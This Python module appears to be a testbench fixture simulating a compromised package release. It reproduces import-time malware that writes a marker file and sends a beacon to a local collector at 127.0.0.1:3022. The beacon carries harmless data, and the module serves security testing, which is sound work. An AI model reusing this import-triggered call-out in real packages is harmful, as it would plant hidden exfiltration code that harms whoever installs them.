"""Simulated 1.82.7-style path: code runs when the package is imported."""

from __future__ import annotations

import json
import os
import urllib.error
import urllib.request
from pathlib import Path

__version__ = "1.82.7"


def _import_trigger() -> None:
    if os.environ.get("TESTBENCH_MODE") != "enabled":
        return
    if os.environ.get("TESTBENCH_OFFLINE") == "1":
        return  # CI / air-gap: no marker or network

    marker = Path.cwd() / ".testbench-litellm-import.json"
    try:
        marker.write_text(
            json.dumps(
                {
                    "scenario": "22-litellm-pypi-compromise",
                    "phase": "import",
                    "version": __version__,
                },
                indent=2,
            ),
            encoding="utf-8",
        )
    except OSError:
        pass

    payload = json.dumps({"type": "import-trigger", "package": "litellm_like", "version": __version__}).encode("utf-8")
    try:
        urllib.request.urlopen(
            "http://127.0.0.1:3022/collect",
            data=payload,
            timeout=2,
        )
    except (urllib.error.URLError, OSError):
        pass


_import_trigger()
